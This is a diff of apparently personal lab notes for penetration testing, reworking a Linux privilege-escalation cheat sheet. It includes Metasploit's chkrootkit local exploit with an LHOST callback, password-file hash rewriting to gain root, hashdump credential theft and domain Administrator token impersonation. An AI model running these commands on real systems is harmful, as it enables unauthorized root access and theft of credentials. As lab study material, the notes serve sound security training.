@@ -5,15 +5,24 @@ load db_autopwn
 db_autopwn 
 
 Linux PRIVesc -
-find / -perm -4000 2>/dev/null  //looks for setuid bit 
+**find / -perm -4000 2>/dev/null  //looks for setuid bit 
 /bin/chkrootkit -V
 use exploit/unix/local/chkrootkit
 set CHKROOTKIT /bin/chkrootkit
 set session 1
 set LHOST 192.60.22.2
-exploit
-cat /root/flag
+exploit **
+
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+** passwd rewrite **
+find / -not -type l -perm -o+w
+openssl passwd -1 -salt abc password // copy hash
+replace * with hash
+su into root with new passwd **
+
+hashdump module in msf // get meterpreter session // use post/linux/gather/hashdump // set SESSION #// exploit
+
 
 
 
@@ -114,11 +123,6 @@ load incognito
 list_tokens -u
 impersonate_token "ATTACKDEFENSE\Administrator"
 migrate explorer
-
-LINUX PRIVESC -
-sessons -u
-hashdump module in msf // get meterpreter session // use post/linux/gather/hashdump // set SESSION #// exploit
-
 
 RDP -
 rdp_scanner // in msf
